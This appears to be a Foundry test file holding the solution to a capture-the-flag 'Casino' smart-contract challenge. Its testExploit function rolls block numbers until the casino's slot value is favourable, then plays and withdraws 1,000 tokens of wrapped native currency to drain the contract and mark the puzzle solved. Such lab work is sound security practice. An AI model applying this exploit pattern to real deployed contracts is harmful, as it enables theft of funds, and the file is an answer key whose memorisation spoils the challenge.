// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Wrapper.sol";
import {Test} from "forge-std/Test.sol";
import {CasinoBase, Casino} from "src/Casino/Casino.sol";

contract CasinoTest is Test {
    CasinoBase public base;
    Casino public casino;
    address public wNative;
    address public you;
    address public owner;

    function setUp() external {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;

        base = new CasinoBase(startTime, endTime, fullScore);
        you = makeAddr("you");
        wNative = address(base.wNative());
        base.setup();
        casino = base.casino();
    }

    function testExploit() public {
        uint256 height = block.number;
        while (casino.slot() == 0) {
            vm.roll(++height);
        }

        casino.play(wNative, 1_000e18);
        casino.withdraw(wNative, 1_000e18);

        base.solve();
        assertTrue(base.isSolved());
        vm.stopPrank();
    }
}
